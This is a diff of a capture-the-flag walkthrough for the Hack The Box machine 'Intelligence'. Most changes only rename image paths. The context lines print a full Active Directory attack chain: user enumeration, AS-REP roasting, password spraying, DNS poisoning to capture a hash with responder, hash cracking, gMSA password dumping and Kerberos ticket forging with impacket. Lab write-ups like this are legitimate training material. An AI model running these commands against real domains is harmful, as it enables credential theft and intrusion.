@@ -93,17 +93,17 @@ The nmap scan discovered the domain name of intelligence.htb and dc.intelligence
 
 ### <mark style="color:$primary;">Website Port 80</mark>
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 On the main page there are 2 documents we can check out&#x20;
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Both documents contain lorem ipsum text
 
 However downloading the files and checking ther metada we discover some usernames.
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can verify these users using Kerberos!
 
@@ -113,7 +113,7 @@ We can verify these users using Kerberos!
 kerbrute userenum --dc 10.10.10.248 -d intelligence.htb usernames
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Checking for AS-REP-Roasting
 
@@ -123,7 +123,7 @@ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.248 'intelligence.htb/' -usersfile 
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 No luck here!
 
@@ -226,7 +226,7 @@ with open('users', 'w') as f:
 
 The script discovers 2 new messages and 30 users. We have a possible password!
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Let's validate the usernames with kerbrute as we did earlier!
 
@@ -236,7 +236,7 @@ Let's validate the usernames with kerbrute as we did earlier!
 kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now we can try password spraying these users with the default password we discovered earlier and see if someone forgot to change it.
 
@@ -248,7 +248,7 @@ netexec smb intelligence.htb -u users -p NewIntelligenceCorpUser9876 --continue-
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Tiffany forgot to change her password! Let's see what level of access we have with Tiffany!
 
@@ -264,7 +264,7 @@ netexec smb intelligence.htb -u tiffany.molina -p NewIntelligenceCorpUser9876 --
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Checking out the SMB shares we come across a non default share that we have access to. Let's check it out
 
@@ -274,7 +274,7 @@ smbclient \\\\intelligence.htb\\IT -U "tiffany.molina%NewIntelligenceCorpUser987
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 There is a script here I am going to download it and take a look at it.
 
@@ -311,7 +311,7 @@ python dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUse
 * <mark style="color:$primary;">**-d**</mark> 10.10.16.2 - The data to add, in this case, the IP to resolve web-deimos to;
 * And the Hostname at the end 10.10.10.248
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ok it seemed to have worked!
 
@@ -321,7 +321,7 @@ Now have responder ready and wait for the request to come through!
 sudo responder -I tun0
 ```
 
-<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nice we managed to capture Ted.Graves NTLMv2 Hash. We can try cracking it
 
@@ -335,7 +335,7 @@ hashcat ted.graves-ntlmv2.hash /usr/share/wordlists/rockyou.txt
 hashcat ted.graves-ntlmv2.hash /usr/share/wordlists/rockyou.txt --showb
 ```
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We managed to crack it and get his password:
 
@@ -353,7 +353,7 @@ netexec ldap intelligence.htb -u ted.graves -p 'Mr.Teddy' --bloodhound --collect
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 start bloodhound
 
@@ -364,7 +364,7 @@ bloodhound
 
 #### <mark style="color:$primary;">Shortest Path from Owned Principals</mark>
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ted.Graves is in the ITSupport group, which has <mark style="color:$primary;">**ReadGMSAPassword**</mark> on SVC\_INT$.&#x20;
 
@@ -380,7 +380,7 @@ With <mark style="color:$primary;">**ReadGMSAPassword**</mark> we can use a pyth
 python gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb
 ```
 
-<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 It worked we managed to get svc\_int$ NTLM hash!
 
@@ -395,7 +395,7 @@ service virtualbox-guest-utils stop
 sudo ntpdate 10.10.10.248
 ```
 
-<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```bash
@@ -403,7 +403,7 @@ impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :5389896
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now to get a shell using the ticket I'll use wmiexec that comes with impacket.
 
